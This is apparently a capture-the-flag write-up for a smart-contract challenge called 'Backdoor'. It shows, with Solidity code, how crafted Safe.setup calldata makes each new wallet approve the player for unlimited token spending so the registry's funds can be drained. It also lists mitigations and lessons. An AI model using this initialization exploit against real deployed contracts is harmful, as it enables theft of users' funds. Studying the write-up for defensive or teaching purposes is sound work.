# Backdoor Challenge - Exploit Documentation

## Overview

This document explains the backdoor vulnerability in the WalletRegistry contract and how to exploit it to drain all 40 DVT tokens in a single transaction.

## The Vulnerability

The WalletRegistry contract has a critical flaw in its validation logic. While it validates that wallets are initialized with the correct `Safe.setup` function selector, it **does not validate the parameters** passed to the setup function.

### Key Vulnerable Code

```solidity
// WalletRegistry.sol - Line 85-86
if (bytes4(initializer[:4]) != Safe.setup.selector) {
    revert InvalidInitialization();
}
```

The registry only checks that the first 4 bytes match `Safe.setup.selector` but ignores the actual parameters, allowing malicious initialization.

## The Exploit Strategy

### 1. Understanding Safe.setup Parameters

The `Safe.setup` function accepts these parameters:
- `_owners`: Array of wallet owners
- `_threshold`: Number of signatures required
- `to`: Address to call during setup (for additional initialization)
- `data`: Calldata for the additional call
- `fallbackHandler`: Fallback handler address
- `paymentToken`: Token for payment
- `payment`: Payment amount
- `paymentReceiver`: Payment recipient

### 2. The Critical Insight: setupModules()

During `Safe.setup`, the function calls `setupModules(to, data)` which:
1. Validates that `to` is a contract
2. Makes a **DelegateCall** to `to` with the provided `data`
3. Executes in the Safe's storage context

### 3. The DelegateCall Problem

Direct token approval via DelegateCall doesn't work because:
- DelegateCall executes target contract code in caller's context
- Token contracts expect to modify their own storage
- The approval call fails silently or behaves unexpectedly

### 4. The Solution: Helper Contract

Create an intermediary contract that makes a regular call to the token:

```solidity
contract ApprovalHelper {
    function approve(address token, address spender, uint256 amount) external {
        IERC20(token).approve(spender, amount);
    }
}
```

## The Complete Attack

### Step 1: Deploy Helper Contract
```solidity
ApprovalHelper helper = new ApprovalHelper();
```

### Step 2: Create Malicious Setup Data
For each beneficiary user:
```solidity
bytes memory approveData = abi.encodeWithSelector(
    helper.approve.selector,
    address(token),
    address(player),
    type(uint256).max
);

bytes memory initData = abi.encodeWithSelector(
    Safe.setup.selector,
    [users[i]], // beneficiary as owner (passes registry validation)
    1,          // threshold = 1 (passes registry validation)
    address(helper), // call our helper contract
    approveData,     // approve player for token spending
    address(0),      // no fallback handler (passes registry validation)
    address(0),      // no payment token
    0,               // no payment
    address(0)       // no payment receiver
);
```

### Step 3: Create Backdoored Wallets
```solidity
SafeProxy safeProxy = walletFactory.createProxyWithCallback(
    address(singletonCopy),
    initData,
    123, // unique salt
    walletRegistry
);
```

### Step 4: Drain Each Wallet
```solidity
token.transferFrom(
    address(safeProxy),
    address(recovery),
    token.balanceOf(address(safeProxy))
);
```

## Attack Flow Analysis

### What Happens During Wallet Creation:

1. **SafeProxyFactory** creates a new SafeProxy
2. **SafeProxy** delegates `Safe.setup` call to Safe singleton
3. **Safe.setup** executes with our malicious parameters:
   - Sets beneficiary as owner ✓ (passes registry check)
   - Sets threshold to 1 ✓ (passes registry check)
   - Calls `setupModules(helper, approveData)`
4. **setupModules** makes DelegateCall to our ApprovalHelper
5. **ApprovalHelper.approve** executes in Safe's context and makes regular call to token
6. **Token approval** is set: Safe approves player for unlimited spending
7. **WalletRegistry.proxyCreated** validates the wallet:
   - ✓ Correct setup selector
   - ✓ Beneficiary as owner
   - ✓ Threshold = 1
   - ✓ No fallback manager
8. **Registry sends 10 DVT** to the Safe wallet
9. **Player drains wallet** using the pre-approved allowance

### Why the Registry's Validations Fail:

- **Function Selector Check**: ✓ Passes (we use correct `Safe.setup.selector`)
- **Owner Check**: ✓ Passes (beneficiary is set as owner)
- **Threshold Check**: ✓ Passes (threshold is 1)
- **Fallback Manager Check**: ✓ Passes (no fallback manager set)
- **Missing Check**: ❌ No validation of `to` and `data` parameters!

## Key Technical Details

### Memory Layout in Assembly Call
When SafeProxyFactory initializes the proxy:
```solidity
assembly {
    if eq(call(gas(), proxy, 0, add(initializer, 0x20), mload(initializer), 0, 0), 0) {
        revert(0, 0)
    }
}
```
- `initializer` contains our malicious `Safe.setup` calldata
- The call executes our backdoor during wallet creation

### DelegateCall vs Regular Call
- **DelegateCall**: Executes target code in caller's storage context
- **Regular Call**: Executes target code in target's storage context
- **Our Helper**: Uses DelegateCall to execute in Safe's context, then makes regular call to token

## Impact

- **All 40 DVT tokens stolen** from the registry
- **Single transaction attack** (satisfies challenge constraint)
- **Bypasses all registry security checks** while appearing legitimate
- **Demonstrates critical validation gap** in smart contract security

## Mitigation

To fix this vulnerability, the WalletRegistry should:

1. **Validate setup parameters**: Check that `to` is either `address(0)` or a whitelisted address
2. **Restrict data parameter**: Ensure `data` is empty or contains only approved function calls
3. **Add parameter hash validation**: Store and validate expected parameter hashes
4. **Implement setup template**: Provide pre-approved setup configurations

## Lessons Learned

1. **Partial validation is dangerous**: Checking only function selectors without parameters creates exploitable gaps
2. **DelegateCall complexity**: Understanding execution contexts is crucial for security
3. **Initialization attacks**: Setup/constructor phases are critical attack vectors
4. **Registry pattern risks**: Callback-based validation requires comprehensive parameter checking

This exploit demonstrates why thorough parameter validation is essential in smart contract security, especially when dealing with complex initialization patterns and callback mechanisms.
